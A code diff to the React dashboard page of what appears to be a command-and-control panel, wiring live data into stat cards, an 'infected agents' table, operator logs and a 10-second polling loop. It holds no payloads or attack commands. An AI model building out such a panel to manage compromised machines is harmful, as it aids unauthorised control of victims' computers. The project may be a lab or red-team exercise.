@@ -1,71 +1,150 @@
+import { useEffect, useState } from "react";
 import StatCard from "../../components/ui/StatsCard";
 import InfectedAgentsTable from "./components/InfectedAgentsTable";
 import SystemLogsCard from "./components/SystemLogsCard";
-
+import { clientService } from "@/services/clientService";
+import { logService } from "@/services/logService";
 
 export default function Dashboard() {
-  const stats = [
-    { title: "Active Agents", value: 3 },
-    { title: "Online Agents", value: 3 },
-    { title: "OS Types", value: 2 },
-  ];
+  const [stats, setStats] = useState([
+    { title: "Total Agents", value: 0, accent: "default" as const },
+    { title: "Online Agents", value: 0, accent: "info" as const },
+    { title: "Admin Agents", value: 0, accent: "warn" as const },
+    { title: "OS Types", value: 0, accent: "default" as const },
+  ]);
 
-  const rows = [
-    {
-      id: 1,
-      AgentID: "57168034-5be5-482a-a786-cdad145e7b1a",
-      IP: "192.168.56.10",
-      OS: "Linux X86_64",
-      Status: "Online",
-    },
-    {
-      id: 2,
-      AgentID: "57168034-5be5-482a-a786-cdad145e7b1a",
-      IP: "192.168.56.10",
-      OS: "Linux X86_64",
-      Status: "Online",
-    },
-    {
-      id: 3,
-      AgentID: "57168034-5be5-482a-a786-cdad145e7b1a",
-      IP: "192.168.56.10",
-      OS: "Linux X86_64",
-      Status: "Online",
-    },
-    {
-      id: 4,
-      AgentID: "57168034-5be5-482a-a786-cdad145e7b1a",
-      IP: "192.168.56.10",
-      OS: "Linux X86_64",
-      Status: "Online",
-    },
-    {
-      id: 5,
-      AgentID: "57168034-5be5-482a-a786-cdad145e7b1a",
-      IP: "192.168.56.10",
-      OS: "Linux X86_64",
-      Status: "Online",
-    },
-  ];
+  const [rows, setRows] = useState<any[]>([]);
+  const [logs, setLogs] = useState<string[]>([]);
+  const [isLoading, setIsLoading] = useState(true);
+  const [error, setError] = useState<string | null>(null);
 
-  const logs = [
-    "[14:20:01] Admin Login Success",
-    "[14:21:05] Agent 57168034 connected",
-    "[14:22:10] Payload sent to Agent 57168034",
-  ];
+  const fetchDashboardData = async () => {
+    try {
+      const [displayData, logsData] = await Promise.all([
+        clientService.getClientsDisplay(),
+        logService.getLogs(),
+      ]);
+
+      setStats([
+        { title: "Total Agents", value: displayData.total_clients || 0, accent: "default" as const },
+        {
+          title: "Online Agents",
+          value: displayData.online_clients_count || 0,
+          accent: "info" as const,
+        },
+        {
+          title: "Admin Agents",
+          value: displayData.admin_clients_count || 0,
+          accent: "warn" as const,
+        },
+        { title: "OS Types", value: displayData.os_types_count || 0, accent: "default" as const },
+      ]);
+
+      const mappedRows = (displayData.clients || []).map((client) => {
+        const lastSeen = new Date(client.last_seen).getTime();
+        const now = new Date().getTime();
+        const isOnline = now - lastSeen < 60000;
+
+        return {
+          id: client.id,
+          AgentID: client.id,
+          IP: client.ip,
+          OS: `${client.os} ${client.arch}`,
+          osName: client.os,
+          isAdmin: client.is_admin,
+          lastSeen: client.last_seen,
+          Status: isOnline ? "Online" : "Offline",
+        };
+      });
+      setRows(mappedRows);
+
+      const formattedLogs = (logsData || []).slice(0, 10).map((log: any) => {
+        const date = new Date(log.created_at);
+        const hours = String(date.getHours()).padStart(2, "0");
+        const minutes = String(date.getMinutes()).padStart(2, "0");
+        const seconds = String(date.getSeconds()).padStart(2, "0");
+        const timestamp = `${hours}:${minutes}:${seconds}`;
+
+        const actor = log.username ? `Operator(${log.username})` : "System";
+        const target = log.client_id
+          ? ` [Agent: ${log.client_id.slice(0, 8)}...]`
+          : "";
+        return `[${timestamp}] ${actor}${target} - ${log.event_type}: ${log.details}`;
+      });
+      setLogs(formattedLogs);
+      setError(null);
+    } catch (err: any) {
+      console.error("Error fetching dashboard data:", err);
+      setError(err.message || "Failed to establish telemetry connection.");
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    fetchDashboardData();
+    const interval = setInterval(fetchDashboardData, 10000);
+    return () => clearInterval(interval);
+  }, []);
+
+  if (isLoading && stats[0].value === 0) {
+    return (
+      <div className="min-h-[calc(100vh-100px)] flex flex-col justify-center items-center font-mono text-green">
+        <style>{`
+          @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(300%); }
+          }
+        `}</style>
+        <div className="relative flex flex-col items-center p-6 border border-green/30 bg-green/5 rounded-lg max-w-md w-full shadow-[0_0_20px_rgba(0,255,65,0.1)]">
+          <div className="absolute top-0 left-0 border-t-2 border-l-2 border-green w-4 h-4 -mt-[1px] -ml-[1px]" />
+          <div className="absolute top-0 right-0 border-t-2 border-r-2 border-green w-4 h-4 -mt-[1px] -mr-[1px]" />
+          <div className="absolute bottom-0 left-0 border-b-2 border-l-2 border-green w-4 h-4 -mb-[1px] -ml-[1px]" />
+          <div className="absolute bottom-0 right-0 border-b-2 border-r-2 border-green w-4 h-4 -mb-[1px] -mr-[1px]" />
+
+          <div className="text-xl font-bold tracking-widest animate-pulse mb-3">
+            SECURE_DCC_LINK_ACTIVE
+          </div>
+          <div className="w-full bg-[#111] h-1.5 rounded overflow-hidden relative border border-green/20">
+            <div
+              className="bg-green h-full absolute left-0 top-0 w-1/3 shadow-[0_0_10px_#00FF41]"
+              style={{ animation: "shimmer 1.5s infinite linear" }}
+            />
+          </div>
+          <div className="text-xs text-green/60 mt-3 font-mono">
+            ESTABLISHING TELEMETRY CONNECTION...
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="flex flex-col px-4 sm:px-8 lg:px-14 py-6 lg:py-10">
       <div className="w-full border-b border-green">
         <h1 className="text-2xl sm:text-3xl lg:text-4xl font-semibold text-green pb-5 lg:pb-7 flex items-center">
-          Fairuz ganteng
+          Dashboard
           <span className="inline-block w-2 h-2 lg:w-3 lg:h-3 rounded-full bg-green ml-2 animate-pulse" />
         </h1>
       </div>
+
+      {error && (
+        <div className="mt-4 p-4 border border-red-500/50 bg-red-950/20 text-red-400 font-mono text-sm rounded relative">
+          <div className="absolute top-0 left-0 border-t-2 border-l-2 border-red-500 w-3 h-3 -mt-[1px] -ml-[1px]" />
+          <div className="absolute top-0 right-0 border-t-2 border-r-2 border-red-500 w-3 h-3 -mt-[1px] -mr-[1px]" />
+          [WARNING] SYSTEM ERROR: {error}
+        </div>
+      )}
+
       {/* Stats Card */}
-      <div className="mt-6 lg:mt-9 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 lg:gap-5">
+      <div className="mt-6 lg:mt-9 grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-4 lg:gap-5">
         {stats.map((item) => (
-          <StatCard key={item.title} title={item.title} value={item.value} />
+          <StatCard
+            key={item.title}
+            title={item.title}
+            value={item.value}
+            accent={item.accent}
+          />
         ))}
       </div>
       <div className="mt-6 lg:mt-6 grid grid-cols-1 lg:grid-cols-3 gap-4 lg:gap-5">
